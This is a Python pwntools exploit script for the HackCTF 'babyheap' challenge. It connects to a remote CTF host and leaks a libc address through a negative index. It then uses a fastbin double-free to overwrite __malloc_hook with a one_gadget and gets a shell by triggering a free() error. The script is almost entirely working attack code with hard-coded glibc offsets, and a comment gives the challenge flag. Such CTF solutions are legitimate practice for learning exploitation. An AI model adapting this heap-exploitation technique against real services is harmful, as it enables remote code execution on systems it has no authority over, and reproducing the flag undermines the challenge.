from pwn import * 

#p = process ("./babyheap")
p = remote("ctf.j0n9hyun.xyz",3030)

#64bit binary, solved from ubuntu 64bit. glibc 2.23

puts_offset = 0x6f690
free_hook_offset = 0x3c67a8
malloc_hook_offset = 0x3c4b10
chunk_offset = 0x3c4aed
system_offset = 0x45390
one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]



def mal(size,cont):
   p.sendlineafter("> ",str(1))
   p.sendlineafter("size: ",str(size))
   p.sendafter("content: ",cont)

def free(idx):
   p.sendlineafter("> ",str(2))
   p.sendlineafter("index: ",str(idx))
   
def show(idx):
   p.sendlineafter("> ",str(3))
   p.sendlineafter("index: ",str(idx))


if __name__ == "__main__" :
   
   mal(0x60,"a"*0x10)
   mal(0x60,"b"*0x10)
   show(-262999)
   sleep(0.5)
   rcv = p.recvline()[:-1]
   log.info(len(rcv))
   libc = u64(rcv+"\x00"*(8-len(rcv))) - puts_offset
   log.info("addr :"+hex(libc))
   
   free_hook = libc + free_hook_offset
   malloc_hook = libc + malloc_hook_offset
   chunk = libc + chunk_offset
   one = libc + one_gadget[2]
   
   #puts func show content is (input value)*8 + ptr_addr(0x602060) mem's value.
   # 0x4005a8 has puts's got addr. 
   # i should overwrite fd to address has "7F" in last 1byte.
   
   free(0)
   free(1)
   free(0)
   
   mal(0x60,p64(chunk)+"f"*0x10)
   mal(0x60,"c"*0x18)
   mal(0x60,"d"*0x18)
   
   mal(0x60,"a"*0x13+p64(one))
   # now, malloc_hook has overwritten by one_gadget. if call malloc() , it execute one_gadget.
   # but can't more malloc() becuz malloc count is 6. however, if free() func has occured some error, 
   # malloc() will called internally. and it will be call malloc_hook -> one_gadget. 
   free(5)
   pause()
   # HackCTF{51mp13_f457b1n_dup!!}
   p.interactive()